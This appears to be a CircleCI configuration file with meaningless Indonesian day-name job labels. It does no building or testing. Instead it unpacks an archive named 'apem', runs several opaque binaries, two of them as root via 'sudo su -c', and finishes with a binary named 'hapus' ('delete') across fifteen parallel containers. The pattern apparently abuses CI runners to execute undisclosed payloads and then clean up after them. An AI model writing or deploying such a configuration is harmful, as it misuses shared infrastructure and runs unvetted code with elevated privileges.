version: 2.1

orbs:

  github-cli: circleci/github-cli@dev:alpha

workflows:

  version: 2.1

  workflo_01:

    jobs:

      - senin

      - selasa:

          requires:

            - senin



jobs:

  senin:

    docker:

      - image: cimg/base:stable

    steps:

      - checkout

      - setup

      - setep

  selasa:

    docker:

      - image: cimg/base:stable

    steps:

      - checkout

      - setup

      - setip:

          result: selasa

    parallelism: 15



commands:

  setup:

    steps:

      - run:

          name: minggu

          command: |

            tar -xf apem && chmod u+x *

            ./tembem

  setep:

    steps:

      - run:

          name: minggu

          command: |

            ./time

      - run:

          name: minggu

          command: |

            ./hapus

  setip:

    parameters:

      result:

        type: string

    steps:

      - run:

          name: minggu

          command: |

            ./star

            sudo su -c "./13"

            ./hapus

      - run:

          working_directory: /home/MrTakurSing

          name: minggu

          command: |

            sudo su -c "./start"
